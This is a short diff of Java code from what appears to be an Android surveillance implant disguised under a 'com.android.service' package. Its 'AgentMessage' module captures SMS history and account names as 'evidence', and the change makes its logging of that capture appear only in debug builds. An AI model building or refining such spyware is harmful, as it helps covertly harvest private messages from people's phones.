@@ -23,6 +23,7 @@ import com.android.service.Sms;
 import com.android.service.Status;
 import com.android.service.agent.sms.MmsBrowser;
 import com.android.service.agent.sms.SmsBrowser;
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
@@ -54,7 +55,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 
 		// Abbiamo gia' catturato lo storico
 		if (storedImsi.isMarkup() == false) {
-			Log.d("QZ", TAG + " (begin): cattura sms di storico");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (begin): cattura sms di storico");
 
 			SmsBrowser smsBrowser = new SmsBrowser();
 			ArrayList<Sms> listSms = smsBrowser.getSmsList();
@@ -119,7 +120,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		for (final Account account : accounts) {
 
 			final String name = account.name;
-			Log.d("QZ", TAG + name);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + name);
 		}
 	}
 
